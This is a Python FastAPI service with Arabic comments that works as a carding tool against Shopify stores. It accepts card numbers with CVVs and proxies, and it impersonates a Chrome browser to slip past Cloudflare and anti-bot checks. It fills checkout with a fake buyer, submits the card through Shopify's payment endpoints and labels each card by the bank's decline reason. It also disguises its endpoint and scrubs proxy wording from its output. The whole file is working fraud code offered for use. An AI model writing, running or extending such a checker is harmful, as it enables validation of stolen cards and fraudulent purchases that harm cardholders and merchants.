from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import random
import asyncio
from html import unescape
from urllib.parse import urlparse

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def safe_response(msg, price, gate):
    clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx").replace("Connection", "Conn").replace("connection", "conn").replace("Timeout", "T-out").replace("timeout", "t-out")
    clean_price = str(price).replace('$', '').strip() if price else "-"
    return {"Response": clean_msg, "Price": clean_price, "Gate": gate}

async def get_working_product(session, store_url):
    """جلب منتج صالح بدون شروط تعجيزية"""
    endpoints = [
        f"{store_url}/products.json?limit=250",
        f"{store_url}/collections/all/products.json?limit=250"
    ]
    for ep in endpoints:
        try:
            res = await session.get(ep, timeout=10, verify=False)
            if res.status_code == 200:
                data = res.json()
                products = data.get('products', []) if isinstance(data, dict) else data
                valid = []
                for prod in products:
                    for var in prod.get('variants', []):
                        if var.get('available'):
                            try:
                                p = float(var.get('price', 0))
                                if p > 10000: p = p / 100.0
                                if p > 0: valid.append((var.get('id'), p))
                            except: pass
                if valid:
                    valid.sort(key=lambda x: x[1])
                    return str(valid[0][0]), "{:.2f}".format(valid[0][1])
        except: continue
    return None, "-"

def extract_token_and_gate(html):
    """استخراج التوكن وبوابة الدفع بدقة"""
    token = None
    gate = "1"
    
    # استخراج التوكن
    patterns = [
        r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']',
        r'value=["\']([^"\']+)["\'][^>]*?name=["\']authenticity_token["\']',
        r'<meta\s+name=["\']csrf-token["\']\s+content=["\']([^"\']+)["\']'
    ]
    for p in patterns:
        match = re.search(p, html, re.IGNORECASE)
        if match:
            token = unescape(match.group(1))
            break
            
    # استخراج بوابة الدفع (Gateway ID)
    gate_match = re.search(r'value=["\'](\d+)["\'][^>]*?name=["\']checkout\[payment_gateway\]["\']', html)
    if not gate_match:
        gate_match = re.search(r'data-select-gateway=["\'](\d+)["\']', html)
    if gate_match:
        gate = gate_match.group(1)
        
    return token, gate

async def check_shopify_authentic(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify Core")
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        try: scope_host = urlparse(store_url).netloc or store_url.replace('https://', '').replace('http://', '').split('/')[0]
        except: scope_host = store_url.replace('https://', '').replace('http://', '').split('/')[0]
        
        proxies = {"http": format_proxy(proxy), "https": format_proxy(proxy)} if proxy else None

        buyer = {
            "email": f"j.smith{random.randint(10000,99999)}@gmail.com", "first_name": "James", "last_name": "Smith",
            "address1": "350 5th Ave", "city": "New York", "province": "NY", "zip": "10118", "country": "US", "phone": "2127363100"
        }

        # استخدام البصمة الأصلية النظيفة (chrome110) التي نجحت معك مسبقاً في تخطي WAF
        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=60, verify=False) as session:
            
            # 1. جلب المنتج
            variant_id, price = await get_working_product(session, store_url)
            if not variant_id: return safe_response("Store has no active products", "-", "Shopify Core")

            # 2. الإضافة للسلة بهدوء
            add_res = await session.post(f"{store_url}/cart/add.js", data={"id": variant_id, "quantity": "1"}, headers={"X-Requested-With": "XMLHttpRequest"})
            if add_res.status_code not in [200, 201]: return safe_response("Anti-Bot Blocked Cart Add", price, "Shopify Core")

            await asyncio.sleep(0.5)

            # 3. فتح الدفع (بدون أي تلاعب في الهيدرز لكي لا نوقظ كلاودفلير)
            res_chk = await session.get(f"{store_url}/checkout", allow_redirects=True)
            html_chk = res_chk.text
            final_url = str(res_chk.url)

            if res_chk.status_code in [403, 429] or "cloudflare" in html_chk.lower() or "just a moment" in html_chk.lower():
                return safe_response("Cloudflare WAF Blocked IP", price, "Shopify Core")
            
            if "/cart" in final_url and "/checkout" not in final_url:
                return safe_response("Redirected back to Cart", price, "Shopify Core")

            # 4. استخراج التوكن الأساسي
            auth_token, gateway_id = extract_token_and_gate(html_chk)
            
            if not auth_token:
                # محاولة أخيرة من رابط JSON
                try:
                    r_js = await session.get(f"{store_url}/cart.js")
                    auth_token, _ = extract_token_and_gate(r_js.text)
                except: pass

            if not auth_token:
                title = re.search(r'<title>([^<]+)</title>', html_chk)
                page_title = title.group(1).strip() if title else "Unknown"
                return safe_response(f"Token Hidden ({page_title[:15]})", price, "Shopify Core")

            # 5. تشفير البطاقة في Shopify PCI (بطريقة آمنة)
            pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json"}
            res_pci = await session.post("https://deposit.us.shopifycs.com/sessions", json={"credit_card": {"number": cc, "month": mm, "year": yy, "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
            
            if res_pci.status_code != 200:
                # تجربة السيرفر البديل إذا كان الأول محظوراً
                res_pci = await session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
                
            if res_pci.status_code != 200: return safe_response("Stripe Gate Blocked IP", price, "Shopify Core")
            card_session_id = res_pci.json().get("id")

            # =================================================================
            # 6. المحرك الشرعي للدفع (بديل GraphQL التالف)
            # =================================================================
            
            # خطوة أ: إرسال العنوان
            addr_payload = {
                "_method": "patch", "authenticity_token": auth_token, "previous_step": "contact_information", "step": "shipping_method",
                "checkout[email]": buyer["email"], "checkout[shipping_address][first_name]": buyer["first_name"], "checkout[shipping_address][last_name]": buyer["last_name"],
                "checkout[shipping_address][address1]": buyer["address1"], "checkout[shipping_address][city]": buyer["city"], "checkout[shipping_address][country]": buyer["country"],
                "checkout[shipping_address][province]": buyer["province"], "checkout[shipping_address][zip]": buyer["zip"], "checkout[shipping_address][phone]": buyer["phone"]
            }
            res_addr = await session.post(final_url, data=addr_payload, allow_redirects=True)
            auth_token2, _ = extract_token_and_gate(res_addr.text)
            auth_token2 = auth_token2 or auth_token
            
            # خطوة ب: إرسال الشحن
            ship_payload = {"_method": "patch", "authenticity_token": auth_token2, "previous_step": "shipping_method", "step": "payment_method"}
            res_ship = await session.post(str(res_addr.url), data=ship_payload, allow_redirects=True)
            auth_token3, new_gate = extract_token_and_gate(res_ship.text)
            auth_token3 = auth_token3 or auth_token2
            gateway_id = new_gate if new_gate != "1" else gateway_id

            # خطوة ج: إرسال الدفع النهائي
            pay_payload = {
                "_method": "patch", "authenticity_token": auth_token3, "previous_step": "payment_method", "step": "",
                "s": card_session_id, "checkout[payment_gateway]": gateway_id, "checkout[credit_card][vault]": "false", "complete": "1"
            }
            res_pay = await session.post(str(res_ship.url), data=pay_payload, allow_redirects=True)
            res_text = res_pay.text.lower()
            
            # 7. قراءة الرد الفعلي من البنك
            if "thank you" in res_text or "order completed" in res_text or "thank_you" in str(res_pay.url): 
                return safe_response("Order completed 💎", price, "Shopify Core")
            elif "insufficient" in res_text: return safe_response("Insufficient Funds", price, "Shopify Core")
            elif "incorrect_cvc" in res_text or "security code" in res_text: return safe_response("Incorrect CVC", price, "Shopify Core")
            elif "zip code" in res_text or "avs" in res_text: return safe_response("ZIP Code Mismatch", price, "Shopify Core")
            elif "do not honor" in res_text: return safe_response("Do Not Honor", price, "Shopify Core")
            else:
                err = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
                if err: return safe_response(err.group(1).strip(), price, "Shopify Core")
                
                # فحص الأخطاء داخل الـ JSON إذا تم إرجاعها
                if "payment_method" in res_text and "error" in res_text:
                    return safe_response("Declined / Payment Error", price, "Shopify Core")
                    
                return safe_response("Declined / Gate Blocked", price, "Shopify Core")

    except Exception as e:
        return safe_response(f"Sys_Err: {str(e)[:40]}", "-", "Shopify Core")

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    return JSONResponse(content=await check_shopify_authentic(cc, url, proxy))
